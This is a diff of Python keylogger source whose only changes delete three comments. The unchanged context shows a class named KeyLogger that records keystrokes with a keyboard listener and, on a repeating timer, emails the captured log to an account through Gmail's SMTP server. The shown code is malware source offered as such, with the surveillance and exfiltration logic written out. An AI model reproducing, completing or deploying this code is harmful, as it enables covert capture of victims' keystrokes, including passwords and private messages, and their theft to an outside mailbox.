@@ -26,8 +26,6 @@ class KeyLogger:
 
         self.appendlog(current_key)
 
-    # Create underlying back structure which will publish emails
-
     def send_mail(self, email, password, message):
         server = smtplib.SMTP('smtp.gmail.com', 587, message.encode("utf8"))
         server.starttls()
@@ -35,15 +33,11 @@ class KeyLogger:
         server.sendmail(email, email, message)
         server.quit()
 
-    # Create Report & Send Email
-
     def report(self):
         self.send_mail(self.email, self.password, "\n\n" + self.log)
         self.log = ""
         timer = threading.Timer(self.interval, self.report)
         timer.start()
-
-    # Start KeyLogger and Send Off Emails
 
     def run(self):
         keyboard_listener = keyboard.Listener(on_press=self.save_data)
